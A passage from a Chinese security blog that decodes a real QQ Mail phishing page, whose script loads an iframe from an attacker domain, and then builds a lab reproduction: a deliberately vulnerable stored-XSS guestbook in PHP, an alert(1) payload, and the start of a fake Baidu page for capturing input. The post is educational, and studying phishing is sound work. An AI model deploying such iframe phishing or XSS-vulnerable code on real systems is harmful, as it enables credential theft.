class="string">"shortcut icon"</span> <span class="attr">href</span>=<span class="string">"https://s.tbcdn.cn/apps/login/static/img/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span>';</span></span><br><span class="line"><span class="xml">				b='<span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">html&#123;overflow:hidden;&#125;body&#123;height:100%;margin:0px;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span> <span class="attr">scroll</span>=<span class="string">"no"</span>&gt;</span>';</span></span><br><span class="line"><span class="xml">				a='<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"main"</span>  <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">src</span>=<span class="string">"';</span></span></span></span><br><span class="line"><span class="xml">				k1='" width="101%"  frameborder="0"&gt;<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>';</span></span><br><span class="line"><span class="undefined"> 				var  d =  window.frames[0];</span></span><br><span class="line"><span class="undefined">  				d.document.write(c b a j1 k1);   </span></span><br><span class="line"><span class="undefined">                &#125;  </span></span><br><span class="line"><span class="undefined">                else  </span></span><br><span class="line"><span class="undefined">                &#123;  </span></span><br><span class="line"><span class="undefined">                &#125;  </span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>"));</span><br><span class="line">//--&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span>"));</span><br><span class="line">//--&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们解码出完整代码就可以看到，他使用javascript的document.write方法，动态写入html页面覆盖整个文档，因为这么大量的js动态写入会非常慢，所以他在页面没有加载完之前，使用了“加载中”来掩盖这个网站原有的内容。</p>
<p>他前面大部分代码应该是从别人钓鱼qq空间用的代码中提取出来的，所以那部分css和js有很多不合理的地方，而且整个页面背景与登陆框都是调用他自己服务器保存好的截图，不是用html和css写出来的，导致不能完整的模仿出qq邮箱的一些样式，欺骗性大大降低。</p>
<p>最后的部分也就是他真正用来盗取账号密码的部分，攻击者远程调用了一个iframe框架,使用js依次将写好的变量c b a j1 k1的内容动态写入当前页面</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span>   <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">width</span>=<span class="string">"100%"</span>  <span class="attr">frameborder</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>   <span class="attr">language</span>=<span class="string">"javascript"</span>&gt;</span><span class="undefined">   </span></span><br><span class="line"><span class="undefined">               var pos,str,para,url;  </span></span><br><span class="line"><span class="undefined">                str = window.location.href;  </span></span><br><span class="line"><span class="undefined">                pos = str.indexOf("?")  ;</span></span><br><span class="line"><span class="undefined">                url = str.substring(pos 1);  </span></span><br><span class="line"><span class="undefined">                if (pos&gt;0)&#123;  </span></span><br><span class="line"><span class="undefined">				n='http://ujhgdgjalkfja2.tk/';</span></span><br><span class="line"><span class="undefined">				j1=n url;</span></span><br><span class="line"><span class="xml">				c='<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"shortcut icon"</span> <span class="attr">href</span>=<span class="string">"https://s.tbcdn.cn/apps/login/static/img/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span>';</span></span><br><span class="line"><span class="xml">				b='<span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">html&#123;overflow:hidden;&#125;body&#123;height:100%;margin:0px;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span> <span class="attr">scroll</span>=<span class="string">"no"</span>&gt;</span>';</span></span><br><span class="line"><span class="xml">				a='<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"main"</span>  <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">src</span>=<span class="string">"';</span></span></span></span><br><span class="line"><span class="xml">				k1='" width="101%"  frameborder="0"&gt;<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>';</span></span><br><span class="line"><span class="undefined"> 				var  d =  window.frames[0];</span></span><br><span class="line"><span class="undefined">  				d.document.write(c b a j1 k1);   </span></span><br><span class="line"><span class="undefined">                &#125;  </span></span><br><span class="line"><span class="undefined">                else  </span></span><br><span class="line"><span class="undefined">                &#123;  </span></span><br><span class="line"><span class="undefined">                &#125;  </span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>其中</p>
<ul>
<li>str=window.location.href是获取当前url赋值给str</li>
<li>pos=str.indexOf(“?”)是寻找str字符串也就是当前url中第一次出现?的位置并且返回给pos</li>
<li>url=str.substring(pos 1)是将pos到结束的字符串返回给url，后面的1小于pos的话，就是将从第一位到?的字符串返回给url</li>
</ul>
<p>前面我们已经知道windows.location.href是<a href="http://www.topaone.com/JPadmin/images/login/ucds/dsif/fysh/g7ues/fsr3/kyuwr1.htm?xmk/youx1?id=qyshz107&amp;/OdJb" target="_blank" rel="noopener">http://www.topaone.com/JPadmin/images/login/ucds/dsif/fysh/g7ues/fsr3/kyuwr1.htm?xmk/youx1?id=qyshz107&amp;/OdJb</a></p>
<p>那么这里url就是xmk/youx1?id=qyshz107&amp;/OdJb</p>
<p>然后整个页面的结果就是：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"shortcut icon"</span> <span class="attr">href</span>=<span class="string">"https://s.tbcdn.cn/apps/login/static/img/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">html&#123;overflow:hidden;&#125;body&#123;height:100%;margin:0px;&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">scroll</span>=<span class="string">"no"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"main"</span>  <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">src</span>=<span class="string">"http://ujhgdgjalkfja2.tk/xmk/youx1/?id=qyshz107&amp;/OdJb"</span> <span class="attr">width</span>=<span class="string">"101%"</span>  <span class="attr">frameborder</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>典型的iframe框架钓鱼，这个时候我们如果在登陆框输入东西，实际上是在对方服务器的一个页面 <a href="http://ujhgdgjalkfja2.tk/xmk/youx1/?id=qyshz107&amp;/OdJb" target="_blank" rel="noopener">http://ujhgdgjalkfja2.tk/xmk/youx1/?id=qyshz107&amp;/OdJb</a> 内输入东西，如果不确定的话我们可以直接访问这个链接看一眼，发现的确是一个制作好的邮箱页面。那么已经到了对方服务器上面的，你的输入对方想怎么记录怎么保存都可以。如果之前输入了账号密码，此时已经在服务器上保存了，对方的目的其实已经达到。</p>
<p>但是进一步抓包测试，发现对方在这里接收了账号密码并保存之后，还会传输数据到真正的qq邮箱地址去登陆，然后返回是否成功登陆的信息，如果失败就返回账号密码错误信息。如果成功登陆，就会控制windows.location.href跳转到真正的qq邮箱mail.qq.com，这样减轻用户的嫌疑。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing05.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing06.png" alt=""></p>
<p>至此，对方的整个钓鱼过程就完成了，如果他的细节处理好一点，对一些萌新就能瞒天过海了。</p>
<p>这个ujhgdgjalkfja2.tk就是对方的域名了，.tk后缀可能大家不常见，但是实际上这是一个注册量非常庞大的顶级域名。</p>
<p>百科中是这样说的：</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing07.png" alt=""></p>
<p>.TK的域名是南太平洋一个仅有1,268人的岛国托克劳（历史上亦称联合群岛或托克劳群岛）的国家顶级域名。它是任何人都可以申请的免费的顶级域名之一。(ccTLD).TK已拥有活跃域名2500万个，成为了世界第一大ccTLD。</p>
<p>既然是免费的国外域名，那么.tk域名一定是很多不法分子所钟爱的。这个域名通过域名反查和ip地址也基本得不到太多有用的信息。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing08.png" alt=""></p>
<h2 id="0x03-复现-环境搭建"><a href="#0x03-复现-环境搭建" class="headerlink" title="0x03 复现-环境搭建"></a>0x03 复现-环境搭建</h2><p>之前在 <a href="http://uuzdaisuki.com/2018/04/24/XSS%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://uuzdaisuki.com/2018/04/24/XSS%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</a> 中提到了钓鱼的几种方式，其中iframe框架钓鱼只描述了一下原理并且用了一个小例子，那么就在这里补充下存储型xss怎么调用iframe钓鱼。</p>
<p>既然要复现整个钓鱼过程，我们就要用到一个存在存储型xss漏洞的页面、一个伪造的html页面、一个接收伪造页面传输的数据的php文件、一个保存数据的txt文件。</p>
<h4 id="留言系统搭建"><a href="#留言系统搭建" class="headerlink" title="留言系统搭建"></a>留言系统搭建</h4><p>首先搭建存在存储型xss漏洞的页面，我们在这里搭建一个简易的留言系统进行测试，一共需要用到message.php和save.php两个页面。</p>
<p>其中message.php负责输入留言和展示留言，代码如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>留言系统<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width:500px;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">style</span>=<span class="string">"text-align:left;"</span> <span class="attr">action</span>=<span class="string">"save.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">昵&amp;nbsp&amp;nbsp称：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">留&amp;nbsp&amp;nbsp言：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"message"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">&lt;?php</span><br><span class="line">$con=mysqli_connect("localhost","root","123456","test");</span><br><span class="line">if(!$con)&#123;</span><br><span class="line"> die("database connect error!");</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,"select `name`, `message` from mess;");</span><br><span class="line"></span><br><span class="line">while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">        echo "&lt;hr&gt;&lt;br&gt;Name: " . urldecode($row["name"]). "&lt;br&gt;  Message: " . urldecode($row["message"]). "&lt;br&gt;&lt;br&gt;&lt;hr&gt;&lt;br&gt;";</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>save.php负责将接收到的昵称和留言上传到数据库，并跳转回message.php这里数据库内只要新建名为mess的表，存在name和message两个字段即可实现这个功能。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$name = urlencode($_REQUEST['name']);</span><br><span class="line">$message = urlencode($_REQUEST['message']);</span><br><span class="line">echo '&lt;br&gt;';</span><br><span class="line"></span><br><span class="line">$con=mysqli_connect("localhost","root","123456","test");</span><br><span class="line">if(!$con)&#123;</span><br><span class="line"> die("database connect error!");</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($name&amp;&amp;$message)</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	mysqli_query($con,"INSERT INTO `mess` (`name`, `message`) VALUES ('".$name."', '".$message."');");</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo '&lt;script language="javascript"&gt;';</span><br><span class="line">echo "location.href='./message.php'";</span><br><span class="line">echo '&lt;/script&gt;';</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>然后我们发现输入正常留言可以显示出来：</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing09.png" alt=""></p>
<p>构造一个xss代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>也可以正常运行，证明存在存储型xss：</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing10.png" alt=""></p>
<h4 id="服务器接收页面"><a href="#服务器接收页面" class="headerlink" title="服务器接收页面"></a>服务器接收页面</h4><p>我们的服务器上，要有一个可供调用的伪造html页面，一个接收数据的php文件，一个储存数据的txt文件。</p>
<p>这里我伪造一个百度的主页进行测试，来捕获这个人搜索的信息。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">href</span>=<span class="string">"image/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"shortcut icon"</span> <span class="attr">href</span>=<span class="string">"image/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">title</span>&gt;</span>百度一下，你就知道<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"> 	.dd&#123;</span></span><br><span class="line"><span class="undefined"> 	color: gray;</span></span><br><span class="line"><span class="undefined"> 	font-family: "微软雅黑";</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	.dd a&#123;</span></span><br><span class="line"><span class="undefined"> 	color: gray;</span></span><br><span class="line"><span class="undefined"> 	font-family: "微软雅黑";</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	.aa a&#123;</span></span><br><span class="line"><span class="undefined"> 	color: #000000;</span></span><br><span class="line"><span class="undefined"> 	font-family: "微软雅黑";</span></span><br><span class="line"><span class="undefined"> 	font-size: 15px;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	body&#123;</span></span><br><span class="line"><span class="undefined"> 	margin: 0;</span></span><br><span class="line"><span class="undefined"> 	padding: 0;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	font:hover&#123;</span></span><br><span class="line"><span class="undefined"> 	cursor: pointer;</span></span><br><span class="line"><span class="undefined"> 	color: red;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	.back-img&#123;</span></span><br><span class="line"><span class="undefined"> 	border: 1px solid #000000;</span></span><br><span class="line"><span class="undefined"> 	position: absolute;</span></span><br><span class="line"><span class="undefined"> 	width: 100%;</span></span><br><span class="line"><span class="undefined"> 	height: 100%;</span></span><br><span class="line"><span class="undefined"> 	top: 0px;</span></span><br><span class="line"><span class="undefined"> 	left: 0px;</span></span><br><span class="line"><span class="undefined"> 	background-color: #000000;</span></span><br><span class="line"><span class="undefined"> 	opacity: 0.3;</span></span><br><span class="line"><span class="undefined"> 	z-index: 100;</span></span><br><span class="line"><span class="undefined"> 	display: none;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	.login&#123;</span></span><br><span class="line"><span class="undefined"> 	border: 1px solid #000000;</span></span><br><span class="line"><span class="undefined"> 	width: 390px;</span></span><br><span class="line"><span class="undefined"> 	height: 500px;</span></span><br><span class="line"><span class="undefined"> 	position: absolute;</span></span><br><span class="line"><span class="undefined"> 	top:26%;</span></span><br><span class="line"><span class="undefined"> 	left: 35%;</span></span><br><span class="line"><span class="undefined"> 	background-color:white;</span></span><br><span class="line"><span class="undefined"> 	z-index: 110;</span></span><br><span class="line"><span class="undefined"> 	display: none;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	.login-top&#123;</span></span><br><span class="line"><span class="undefined"> 	position: absolute;</span></span><br><span class="line"><span class="undefined"> 	width: 100%;</span></span><br><span class="line"><span class="undefined"> 	height: 10%;</span></span><br><span class="line"><span class="undefined"> 	background-color:white;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	.close-login&#123;</span></span><br><span class="line"><span class="undefined"> 	display: block;</span></span><br><span class="line"><span class="undefined"> 	position: absolute;</span></span><br><span class="line"><span class="undefined"> 	right: 10px;</span></span><br><span class="line"><span class="undefined"> 	top: 5px;</span></span><br><span class="line"><span class="undefined"> 	width: 30px;</span></span><br><span class="line"><span class="undefined"> 	height: 30px;</span></span><br><span class="line"><span class="undefined"> 	text-align: center;</span></span><br><span class="line"><span class="undefined"> 	line-height: 30px;</span></span><br><span class="line"><span class="undefined"> 	font-size: 30px;</span></span><br><span class="line"><span class="undefined"> 	color: gray;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	.close-login:hover&#123;</span></span><br><span class="line"><span class="undefined"> 	border: 1px solid gray;</span></span><br><span class="line"><span class="undefined"> 	cursor: pointer;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	.login-top:hover&#123;</span></span><br><span class="line"><span class="undefined"> 	cursor: move;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	 </span></span><br><span class="line"><span class="undefined"> 	</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"0px"</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"800px"</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">tr</span> <span class="attr">height</span>=<span class="string">"10%"</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span> <span class="attr">class</span>=<span class="string">"aa"</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>新闻<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&amp;nbsp;&amp;nbsp;</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>hao123<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&amp;nbsp;&amp;nbsp;</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>地图<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&amp;nbsp;&amp;nbsp;</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>视频<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&amp;nbsp;&amp;nbsp;</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>贴吧<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&amp;nbsp;&amp;nbsp;</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>学术<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&amp;nbsp;&amp;nbsp;</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">font</span> <span class="attr">class</span>=<span class="string">"tt"</span> <span class="attr">onclick</span>=<span class="string">"login()"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">font</span>&gt;</span>&amp;nbsp;&amp;nbsp;</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>设置&amp;nbsp;&amp;nbsp;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">style</span>=<span class="string">"border:0;width: 80px;height: 24px;background-color: #317EF3;color: white;font-size: 12px;"</span>&gt;</span>更多产品<span class="tag">&lt;/<span class="name">button</span>&gt;</span>&amp;nbsp;&amp;nbsp;</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"> 	